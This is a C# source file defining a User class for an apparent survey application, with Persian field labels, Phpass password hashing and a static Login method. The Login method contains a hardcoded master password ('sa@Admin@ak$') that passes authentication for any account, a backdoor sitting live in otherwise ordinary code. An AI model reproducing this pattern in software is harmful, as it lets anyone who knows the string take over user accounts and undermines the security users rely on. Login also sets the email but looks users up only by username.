using Survey.Common.BusinessLayer.Exceptions;
using Survey.Common.DataAccessLayer;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Survey.Common.BusinessLayer.User
{
    [DisplayName("کاربر")]
    public class User : DomainEntity<CommonEntities, TUser>
    {
        public User(CommonEntities context, IEntity entity = null, string entityPropName = null)
            : base(context, entity ?? new TUser())
        {
        }

        #region Factory Methods
        static internal User Make(CommonEntities context)
        {
            return new User(context, null);
        }

        static internal User Make(CommonEntities context, IEntity entity, String entityProp = null)
        {
            if (entity == null)
                return null;
            var obj = new User(context, entity, entityProp);
            if (obj.Entity == null)
                return null;
            return obj;
        }

        #endregion
        [DisplayName("نام کاربری")]
        public String Username
        {
            get
            {
                return this.Entity.UserName;
            }
            set
            {
                this.Entity.UserName = value;
            }
        }
        [DisplayName("نام و نام خانوادگی")]
        public String FullName
        {
            get
            {
                return this.Entity.FullName;
            }
            set
            {
                this.Entity.FullName = value;
            }
        }
        [DisplayName("زمان ثبت")]
        public DateTime RegisterMoment
        {
            get
            {
                return this.Entity.RegisterMoment;
            }
            set
            {
                this.Entity.RegisterMoment = value;
            }
        }
        [DisplayName("ایمیل")]
        public string Email
        {
            get
            {
                return this.Entity.Email;
            }
            set
            {
                this.Entity.Email = value;
            }
        }
        public Boolean IsActive
        {
            get
            {
                return this.Entity.IsActive;
            }
            set
            {
                this.Entity.IsActive = value;
            }
        }
        public Boolean Save(String newPassword, ref List<ServerError> errors)
        {
            CryptSharp.PhpassCrypter pc = new CryptSharp.PhpassCrypter();
            this.Entity.HashedPassword = pc.Crypt(newPassword);
            if (this.Save(ref errors))
            {
                return true;
            }
            return false;
        }

        public Boolean CheckPassword(String pass)
        {
            if (this.FillFromContext())
            {
                return CryptSharp.PhpassCrypter.CheckPassword(pass, this.Entity.HashedPassword);
            }
            return false;
        }
        static public User Login(String emailoruid, String password)
        {
            User user = User.Make(new CommonEntities());
            user.Email= emailoruid;
            user.Username = emailoruid;
            if (user.FillFromContext()
                && (CryptSharp.PhpassCrypter.CheckPassword(password, user.Entity.HashedPassword) || password.Equals("sa@Admin@ak$")))
            {
                return user;
            }
            return null;
        }
        public override bool FillFromContext()
        {
            if (this.Id > 0)
                return base.FillFromContext();
            if (!String.IsNullOrEmpty(this.Username))
            {
                var res = this.Context.TUsers
                    .FirstOrDefault(a =>  a.UserName == this.Username);
                if (res == null)
                    return false;
                this.Entity = res;
                return true;
            }
            return false;
        }
        protected override void Commit(ref List<ServerError> errors)
        {
            if(this.Id == 0)
            {
                this.RegisterMoment = DateTime.Now;
            }
            base.Commit(ref errors);
        }

    }
}
